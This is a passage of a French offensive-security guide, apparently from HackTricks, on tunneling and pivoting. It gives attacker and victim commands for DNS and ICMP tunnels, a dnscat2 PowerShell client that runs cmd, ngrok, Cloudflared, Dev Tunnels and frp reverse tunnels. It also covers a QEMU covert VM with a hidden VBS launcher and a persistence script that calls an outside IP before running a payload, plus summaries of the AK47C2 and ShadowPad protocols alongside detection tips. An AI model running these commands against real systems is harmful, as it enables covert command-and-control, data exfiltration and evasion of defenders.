YARP (Yet Another Reverse Proxy) est la boîte à outils de proxy inverse .NET de Microsoft. Vous la trouverez ici : [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine crée un tunnel IPv4 via des requêtes DNS et utilise des interfaces TUN ; la configuration documentée nécessite les privilèges requis pour créer ces interfaces aux deux extrémités.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

Le transport DNS entraîne une surcharge supérieure à celle du TCP direct et est généralement lent ; vous pouvez créer une connexion SSH compressée via ce tunnel à l’aide de :<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Téléchargez-le ici**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 établit un canal chiffré de commande et de contrôle via DNS ; les commandes serveur et client ci-dessous suivent l’utilisation documentée.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **Dans PowerShell**

Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans PowerShell ; son README documente les paramètres de `Start-Dnscat2` indiqués ci-dessous.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Redirection de port avec dnscat**

La commande interactive `listen` de Dnscat2 associe un écouteur local à un hôte et un port distants.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Modifier le DNS de proxychains

Proxychains-ng intercepte les connexions TCP liées dynamiquement et ne peut pas transporter UDP ni ICMP ; le proxy DNS est configurable : inspectez donc le fichier `proxychains.conf` installé et l’assistant de résolution au lieu de supposer qu’un résolveur public particulier est utilisé. Les scripts `proxyresolv` historiques exposent `PROXY_DNS_SERVER` pour choisir le résolveur ; utilisez un résolveur accessible depuis le pivot lorsque des noms internes sont nécessaires.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels en Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### DNS TXT personnalisé / C2 JSON HTTP (AK47C2)

L’acteur Storm-2603 a créé un **C2 à double canal (« AK47C2 »)** qui abuse *uniquement* du trafic **DNS** sortant et des requêtes **HTTP POST** simples — deux protocoles rarement bloqués sur les réseaux d’entreprise.<sup>[[2]](#references)</sup>

1. **Mode DNS (AK47DNS)**
   • Génère un SessionID aléatoire de 5 caractères (par exemple `H4T14`).  
   • Ajoute `1` devant pour les *demandes de tâches* ou `2` pour les *résultats*, puis concatène différents champs (indicateurs, SessionID, nom de l’ordinateur).  
   • Chaque champ est **chiffré par XOR avec la clé ASCII `VHBD@H`**, encodé en hexadécimal et assemblé avec des points — le tout se terminant par le domaine contrôlé par l’attaquant :

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Les requêtes utilisent `DnsQuery()` pour les enregistrements **TXT** (et **MG** en secours).  
   • Lorsque la réponse dépasse 0xFF octets, la backdoor **fragmente** les données en morceaux de 63 octets et insère les marqueurs :
     `s<SessionID>t<TOTAL>p<POS>` afin que le serveur C2 puisse les réordonner.

2. **Mode HTTP (AK47HTTP)**
   • Construit une enveloppe JSON :
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • L’ensemble du blob est XOR-`VHBD@H` → hexadécimal → envoyé dans le corps d’un **`POST /`** avec l’en-tête `Content-Type: text/plain`.
   • La réponse utilise le même encodage et le champ `cmd` est exécuté avec `cmd.exe /c <command> 2>&1`.

Notes Blue Team
• Recherchez les **requêtes TXT** inhabituelles dont le premier label est une longue chaîne hexadécimale et qui se terminent toujours par un domaine rare.
• Une clé XOR constante suivie d’ASCII-hex est facile à détecter avec YARA : `6?56484244?484` (`VHBD@H` en hexadécimal).
• Pour HTTP, signalez les corps de requête POST `text/plain` constitués uniquement de caractères hexadécimaux et dont la longueur est un multiple de deux octets.

{{#note}}
Le canal limite chaque label de sous-domaine à 63 octets, conformément aux limites DNS, mais le respect du protocole ne le rend pas furtif pour autant ; les domaines rares, les longs labels hexadécimaux et le volume de requêtes restent des signes de détection.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documente un tunnel IPv4-sur-ICMP utilisant un périphérique TUN et des requêtes d’écho ICMP ; sa configuration nécessite des privilèges suffisants pour créer l’interface.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Téléchargez-le ici**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng transporte des connexions TCP via ICMP et utilise les options `-p`, `-l`, `-r` et `-R` ci-dessous pour le proxy, l’écouteur local, l’hôte de destination et le port de destination.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) est un agent qui rend accessibles en ligne des services réseau locaux via un tunnel sécurisé ; sa CLI documente les points de terminaison HTTP, TCP et d’URL de fichier, et le nom d’hôte du point de terminaison affiché peut varier selon le point de terminaison et le compte.<sup>[[39]](#references)</sup>

### Installation

- Créez un compte : https://ngrok.com/signup
- Téléchargement du client :

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Usages de base

**Documentation :** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_L’agent prend également en charge les options d’authentification et TLS, au besoin.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Exposer des fichiers via HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing des appels HTTP

_Utile pour XSS, SSRF, SSTI ..._\
L’agent autonome expose par défaut son interface d’inspection HTTP à l’adresse `http://127.0.0.1:4040` ; cette interface concerne le trafic HTTP.<sup>[[40]](#references)</sup>

#### Tunneling d’un service HTTP interne

L’option `--host-header=rewrite` réécrit l’en-tête HTTP `Host` envoyé au serveur en amont afin qu’il corresponde au service local.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Exemple de configuration simple de ngrok.yaml

Cela utilise ngrok Agent Config v2 ; les tunnels nommés utilisent `proto` et `addr` et sont démarrés avec `ngrok start`.<sup>[[42]](#references)</sup> Cela ouvre 3 tunnels :

- 2 TCP
- 1 HTTP avec exposition de fichiers statiques depuis /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels peut publier un service local reposant sur TCP via l’infrastructure de relais de Microsoft. La CLI hôte crée un tunnel sortant, tandis que `devtunnel connect` recrée le port hébergé sur le client. Par défaut, les tunnels nécessitent une authentification, sauf si les contrôles d’accès sont délibérément assouplis.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Cela peut exposer RDP via `*.devtunnels.ms` sans ouvrir de nouveau port d’écoute entrant sur le périmètre. Cette technique peut aussi être combinée à un tunnel de canal virtuel RDP comme `rdp2tcp`, transformant la session RDP en pivot de second niveau pour acheminer du trafic TCP arbitraire.<sup>[[58]](#references)</sup>

Pour la détection, corrélez l’exécution de la CLI Dev Tunnels au trafic DNS/TLS vers `*.devtunnels.ms` et aux événements inattendus de canal virtuel RDP. Un tunnel authentifié n’est pas inoffensif simplement parce qu’il utilise un relais appartenant à Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Le connecteur `cloudflared` de Cloudflare Tunnel établit des connexions sortantes ; les applications publiées peuvent acheminer HTTP, HTTPS, TCP, SSH et RDP, tandis que les quick tunnels sont conçus pour le développement HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### One-liner de quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Origine SOCKS5 (mode hérité)

Le flag historique `--socks5` indique à `cloudflared` que l’origine locale utilise le protocole SOCKS5 ; il ne crée pas d’écouteur SOCKS5 local. Pour un tunnel géré, `originRequest.proxyType: socks` configure la gestion de l’origine SOCKS5.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Tunnels persistants avec DNS

La configuration de tunnel gérée localement utilise les clés en minuscules `tunnel`, `credentials-file` et `url`, comme indiqué ci-dessous.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Démarrer le connecteur :

```bash
cloudflared tunnel run mytunnel
```

Le connecteur établit des connexions sortantes et négocie par défaut QUIC, avec un repli sur HTTP/2 ; ne partez pas du principe que tous les déploiements utilisent TCP/443. Exécutez-le avec uniquement les privilèges requis par votre déploiement.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) est un reverse proxy Go prenant en charge **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX et XTCP**. XTCP utilise le hole punching P2P, dont le succès dépend du NAT. Depuis la version **v0.53.0**, il peut agir comme une **passerelle SSH Tunnel**, permettant à un hôte cible d’utiliser le client OpenSSH standard sans binaire `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Tunnel TCP inversé classique

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Utiliser la nouvelle passerelle SSH (sans binaire frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

La commande ci-dessus publie le port **8080** de la victime sous la forme **attacker_ip:9000** à l’aide du client OpenSSH standard, tandis que `frps` fournit la passerelle.<sup>[[50]](#references)</sup>

## Connexions UDP de rappel assistées par STUN

Les requêtes STUN Binding envoyées depuis un socket UDP peuvent révéler son adresse IP et son port server-reflexive, tandis qu’un trafic périodique maintient active l’association NAT. Un serveur STUN public ne relaie pas des paquets de contrôle arbitraires.<sup>[[60]](#references)</sup> Une conception de connexion de rappel analysée conservait le même socket UDP pour un court datagramme de contrôle, puis utilisait une *connexion TCP sortante distincte* pour récupérer et exécuter des commandes après réception du signal.<sup>[[59]](#references)</sup>

Pour recevoir le paquet UDP du contrôleur, une conception doit tout de même partager le mappage avec ce contrôleur et respecter la politique de filtrage du NAT. Un filtrage dépendant de l’adresse ou du port peut accepter les réponses du serveur STUN, mais rejeter les paquets provenant d’un autre point de terminaison.<sup>[[60]](#references)[[61]](#references)</sup> Le mécanisme de rendez-vous de la porte dérobée analysée n’a pas été vérifié : des réponses STUN réussies ne prouvent donc pas, à elles seules, que son canal de contrôle est joignable.<sup>[[59]](#references)</sup> Pour un protocole distinct doté d’un mécanisme de rendez-vous explicite et d’une solution de relais de secours, consultez [le contournement du NAT des caméras PPPP](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Tunnels furtifs basés sur des VM avec QEMU

La mise en réseau en mode utilisateur de QEMU ne nécessite pas de privilèges root ou administrateur pour le réseau virtuel, et `-netdev user,hostfwd=...` redirige les connexions TCP, UDP ou UNIX de l’hôte vers l’invité.<sup>[[51]](#references)</sup> TrustedSec a décrit une VM Tiny Core sous QEMU et une tentative de tunnel SSH inversé lors d’un incident où un EDR axé sur l’hôte pouvait ne pas détecter l’activité dans l’invité.<sup>[[1]](#references)</sup>

### Une ligne de commande rapide

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• La commande ci-dessus lance une machine invitée **Tiny Core Linux** avec 256 MiB de mémoire et une image disque qcow2 ; l’image disque n’est pas un disque en RAM.
• Le port **2222/tcp** de l’hôte Windows est redirigé de manière transparente vers le port **22/tcp** de la machine invitée.  
• Du point de vue de l’attaquant, la cible expose simplement le port 2222 ; tous les paquets qui l’atteignent sont traités par le serveur SSH exécuté dans la VM.

### Lancement furtif via VBScript

TrustedSec a observé des lancements de QEMU pilotés par VBS et des images Tiny Core dans l’incident cité ci-dessus.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

L’exécution du script avec `cscript.exe //B update.vbs` garde la fenêtre masquée.<sup>[[1]](#references)</sup>

### Persistance dans l’invité

L’incident cité décrit la persistance dans l’invité Tiny Core sans état via `/opt/bootlocal.sh` et `/opt/filetool.lst` :<sup>[[1]](#references)</sup>

1. Déposer la charge utile dans `/opt/123.out`  
2. Ajouter à la fin de `/opt/bootlocal.sh` :

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Ajoutez `home/tc` et `opt` à `/opt/filetool.lst` afin que la charge utile soit empaquetée dans `mydata.tgz` à l’arrêt.

### Considérations relatives à la télémétrie

• L’hôte expose toujours le processus QEMU, l’image qcow2 et tout écouteur redirigé par l’hôte.  
• Les analyses de processus effectuées uniquement sur l’hôte peuvent ne pas inspecter les processus invités, mais la virtualisation ne garantit pas l’évasion ; la télémétrie réseau, QEMU et des images peut tout de même révéler l’activité.<sup>[[1]](#references)[[51]](#references)</sup>

### Conseils pour les défenseurs

• Déclenchez une alerte en cas de présence de **binaires QEMU/VirtualBox/KVM inattendus** dans des chemins accessibles en écriture aux utilisateurs.  
• Bloquez les connexions sortantes provenant de `qemu-system*.exe`.  
• Recherchez les ports d’écoute rares (2222, 10022, …) qui se mettent à écouter immédiatement après le lancement de QEMU.

## Nœuds relais IIS/HTTP.sys via `HttpAddUrl` (ShadowPad)

Check Point décrit le module IIS de ShadowPad comme transformant des serveurs web de périmètre compromis en portes dérobées et nœuds relais en liant des préfixes d’URL via `HttpAddUrl`.<sup>[[3]](#references)</sup>

Le même rapport détaille les paramètres par défaut, les écouteurs génériques, le déchiffrement des paquets, les files d’attente de relais et la télémétrie de débogage résumés ci-dessous.<sup>[[3]](#references)</sup>

* **Valeurs de configuration par défaut** – si la configuration JSON du module omet des valeurs, celui-ci utilise des paramètres IIS plausibles (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Ainsi, IIS répond au trafic légitime avec l’identification appropriée.
* **Interception générique** – les opérateurs fournissent une liste de préfixes d’URL séparés par des points-virgules (caractères génériques dans l’hôte et le chemin). Le module appelle `HttpAddUrl` pour chaque entrée, de sorte que HTTP.sys achemine les requêtes correspondantes vers le gestionnaire malveillant ; les requêtes non correspondantes suivent le comportement IIS normal.
* **Premier paquet chiffré** – les deux premiers octets du corps de la requête contiennent la valeur initiale d’un PRNG personnalisé sur 32 bits. Chaque octet suivant est combiné par XOR avec le flux de clés généré avant l’analyse du protocole :

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Orchestration du relais** – le module maintient deux listes : « servers » (nœuds en amont) et « clients » (implants en aval). Les entrées sont supprimées si aucun heartbeat n’est reçu pendant environ 30 secondes. Lorsque les deux listes ne sont pas vides, le module associe le premier serveur actif au premier client actif et achemine simplement les octets entre leurs sockets jusqu’à ce qu’un côté se déconnecte.
* **Télémétrie de débogage** – la journalisation facultative enregistre l’adresse IP source, l’adresse IP de destination et le nombre total d’octets transférés pour chaque association. Les enquêteurs se sont appuyés sur ces traces pour reconstituer le mesh ShadowPad couvrant plusieurs victimes.

---

## Autres outils à vérifier

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Se cacher dans l’ombre : tunnels furtifs via la virtualisation QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Avant ToolShell : exploration des précédentes opérations de ransomware de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Dans Ink Dragon : révélation du réseau relais et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README d’Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Guide de référence Nmap : contourner les restrictions de pare-feu/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Manuel ssh d’OpenBSD](https://man.openbsd.org/ssh)
- [7] [Manuel sshd_config d’OpenBSD](https://man.openbsd.org/sshd_config)
- [8] [Notes de version d’OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README de sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit : pivotement dans Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Documentation du module socks_proxy de Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Documentation du module autoroute de Metasploit](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike : proxy SOCKS](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike : redirection de port inversée](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README de reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README de Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Guide de démarrage rapide de Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Listeners de Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Localhost de Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README de rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Manuel de socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Manuel de PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Options de ligne de commande de PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Commande netsh interface portproxy de Microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README de SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Documentation de Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Règles de proxification de Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Manuel d’OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README de YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README d’iodine](https://code.kryo.se/iodine/README.html)
- [32] [README de dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README de dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README de proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035 : noms de domaine – mise en œuvre et spécification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README de ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI de l’agent ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Interface d’inspection Web ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Hôtes virtuels ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Configuration v2 de l’agent ngrok](https://ngrok.com/docs/agent/config/v2)
- [43] [Présentation de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Paramètres d’origine de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Configuration de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Fichier de configuration de Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Paramètres d’exécution de Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Concepts de frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP de frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [Passerelle SSH Tunnel de frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Documentation réseau de QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README de wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Dépôt de code source NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale : un tailnet adossé à un CDN depuis un BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Commandes CLI de Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle : GhostContainer et tunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs - La backdoor Linux ClingSTUN exploite l’infrastructure STUN publique](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 - Utilitaires de traversée de session pour NAT (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 - Exigences comportementales du NAT pour UDP unicast](https://www.rfc-editor.org/rfc/rfc4787.html)
{{#include ../banners/hacktricks-training.md}}
